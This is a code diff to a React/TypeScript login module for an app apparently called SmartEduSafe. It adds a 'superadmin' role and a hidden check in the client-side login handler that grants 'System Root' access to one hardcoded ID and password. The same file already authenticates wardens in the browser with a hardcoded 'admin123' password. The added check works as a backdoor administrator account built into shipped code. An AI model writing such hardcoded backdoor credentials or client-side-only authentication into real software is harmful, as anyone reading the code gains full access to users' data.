@@ -101,9 +101,14 @@ export const useSmartEduSafe = () => {
   }, []);
 
   const login = (id: string, role: UserRole) => {
-    const name = role === 'warden' 
-      ? (id === 'warden@asrama.edu' ? 'Head Warden' : `Warden ${id}`)
-      : `Student ${id}`;
+    let name = '';
+    if (role === 'superadmin') {
+      name = 'System Root';
+    } else if (role === 'warden') {
+      name = (id === 'warden@asrama.edu' ? 'Head Warden' : `Warden ${id}`);
+    } else {
+      name = `Student ${id}`;
+    }
     const newUser = { id, role, name };
     setUser(newUser);
     localStorage.setItem('smartedusafe_user', JSON.stringify(newUser));
@@ -178,6 +183,12 @@ export const LoginView = ({ onLogin }: { onLogin: (id: string, role: UserRole) =
   const AUTHORIZED_STUDENTS = ['S2024-001', 'S2024-002', 'S2024-003', 'BIO-STUDENT-01'];
 
   const handleLogin = () => {
+    // Special Super Admin check
+    if (id === 'admin.kitabuddy.iam.proton.me' && password === '21412026') {
+      onLogin(id, 'superadmin');
+      return;
+    }
+
     if (role === 'warden') {
       if (id === 'warden@asrama.edu' && password === 'admin123') {
         onLogin(id, role);
